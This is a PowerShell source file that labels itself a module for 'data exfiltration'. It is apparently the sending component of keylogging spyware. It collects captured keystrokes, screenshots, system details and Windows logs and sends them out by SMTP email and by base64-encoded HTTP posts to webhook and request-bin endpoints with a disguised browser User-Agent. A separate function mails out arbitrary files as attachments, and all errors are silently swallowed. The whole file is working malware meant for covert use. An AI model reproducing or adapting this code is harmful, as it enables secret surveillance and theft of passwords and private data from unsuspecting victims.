<#
.SYNOPSIS
    System Communication Module
.DESCRIPTION
    Handles data exfiltration and communication capabilities
#>

function Send-SystemReport {
    param(
        [hashtable]$Config
    )
    
    try {
        # Collect all data
        $DataDir = Join-Path $env:TEMP "SystemCache"
        $ReportData = @{}
        
        # Collect keylogger data
        $KeylogFile = Join-Path $DataDir "keylog.txt"
        if (Test-Path $KeylogFile) {
            $ReportData.Keylogger = Get-Content $KeylogFile -Raw -ErrorAction SilentlyContinue
        }
        
        # Collect screenshots
        $ScreenshotDir = Join-Path $DataDir "Screenshots"
        if (Test-Path $ScreenshotDir) {
            $ReportData.Screenshots = Get-ChildItem $ScreenshotDir -Filter "*.png" | Select-Object -Last 5
        }
        
        # Collect system information
        $SystemInfoFile = Join-Path $DataDir "system_info.txt"
        if (Test-Path $SystemInfoFile) {
            $ReportData.SystemInfo = Get-Content $SystemInfoFile -Raw -ErrorAction SilentlyContinue
        }
        
        # Collect Windows logs
        $WindowsLogsFile = Join-Path $DataDir "windows_logs.txt"
        if (Test-Path $WindowsLogsFile) {
            $ReportData.WindowsLogs = Get-Content $WindowsLogsFile -Raw -ErrorAction SilentlyContinue
        }
        
        # Send via email
        if ($Config.Email -ne "your_email@gmail.com") {
            Send-EmailReport -Config $Config -Data $ReportData
        }
        
        # Send via HTTP (alternative method)
        Send-HTTPReport -Data $ReportData
        
        return $true
    }
    catch {
        return $false
    }
}

function Send-EmailReport {
    param(
        [hashtable]$Config,
        [hashtable]$Data
    )
    
    try {
        # Create email message
        $Subject = "System Report - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
        $Body = @"
System Report Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')

Computer Name: $env:COMPUTERNAME
User Name: $env:USERNAME
Domain: $env:USERDOMAIN

Keylogger Data:
$($Data.Keylogger)

System Information:
$($Data.SystemInfo)

Windows Logs:
$($Data.WindowsLogs)
"@
        
        # Create SMTP client
        $SmtpClient = New-Object System.Net.Mail.SmtpClient
        $SmtpClient.Host = $Config.SmtpServer
        $SmtpClient.Port = $Config.SmtpPort
        $SmtpClient.EnableSsl = $Config.UseTls
        $SmtpClient.Credentials = New-Object System.Net.NetworkCredential($Config.Email, $Config.Password)
        
        # Create message
        $Message = New-Object System.Net.Mail.MailMessage
        $Message.From = $Config.Email
        $Message.To.Add($Config.Email)
        $Message.Subject = $Subject
        $Message.Body = $Body
        
        # Add attachments (screenshots)
        if ($Data.Screenshots) {
            foreach ($Screenshot in $Data.Screenshots) {
                $Attachment = New-Object System.Net.Mail.Attachment($Screenshot.FullName)
                $Message.Attachments.Add($Attachment)
            }
        }
        
        # Send email
        $SmtpClient.Send($Message)
        $Message.Dispose()
        $SmtpClient.Dispose()
        
        return $true
    }
    catch {
        return $false
    }
}

function Send-HTTPReport {
    param(
        [hashtable]$Data
    )
    
    try {
        # Alternative exfiltration method via HTTP
        $WebClient = New-Object System.Net.WebClient
        
        # Create data payload
        $Payload = @{
            ComputerName = $env:COMPUTERNAME
            UserName = $env:USERNAME
            Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
            KeyloggerData = $Data.Keylogger
            SystemInfo = $Data.SystemInfo
        } | ConvertTo-Json -Compress
        
        # Encode payload
        $EncodedPayload = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Payload))
        
        # Send to multiple endpoints (for redundancy)
        $Endpoints = @(
            "https://httpbin.org/post",
            "https://webhook.site/your-unique-url",
            "https://requestbin.io/your-bin-id"
        )
        
        foreach ($Endpoint in $Endpoints) {
            try {
                $WebClient.Headers.Add("Content-Type", "application/json")
                $WebClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                
                $Response = $WebClient.UploadString($Endpoint, $EncodedPayload)
                break  # Stop after first successful send
            }
            catch {
                # Continue to next endpoint
            }
        }
        
        $WebClient.Dispose()
        return $true
    }
    catch {
        return $false
    }
}

function Send-FileExfiltration {
    param(
        [string]$FilePath,
        [hashtable]$Config
    )
    
    try {
        if (-not (Test-Path $FilePath)) {
            return $false
        }
        
        # Read file content
        $FileContent = Get-Content $FilePath -Raw -Encoding UTF8
        $FileName = Split-Path $FilePath -Leaf
        
        # Create email with file attachment
        $Subject = "File Report - $FileName"
        $Body = "File: $FileName`nSize: $((Get-Item $FilePath).Length) bytes`nTimestamp: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
        
        # Send via email
        if ($Config.Email -ne "your_email@gmail.com") {
            $SmtpClient = New-Object System.Net.Mail.SmtpClient
            $SmtpClient.Host = $Config.SmtpServer
            $SmtpClient.Port = $Config.SmtpPort
            $SmtpClient.EnableSsl = $Config.UseTls
            $SmtpClient.Credentials = New-Object System.Net.NetworkCredential($Config.Email, $Config.Password)
            
            $Message = New-Object System.Net.Mail.MailMessage
            $Message.From = $Config.Email
            $Message.To.Add($Config.Email)
            $Message.Subject = $Subject
            $Message.Body = $Body
            
            $Attachment = New-Object System.Net.Mail.Attachment($FilePath)
            $Message.Attachments.Add($Attachment)
            
            $SmtpClient.Send($Message)
            $Message.Dispose()
            $SmtpClient.Dispose()
        }
        
        return $true
    }
    catch {
        return $false
    }
}

function Test-InternetConnection {
    try {
        $Response = Invoke-WebRequest -Uri "https://www.google.com" -TimeoutSec 10 -UseBasicParsing
        return $Response.StatusCode -eq 200
    }
    catch {
        return $false
    }
} 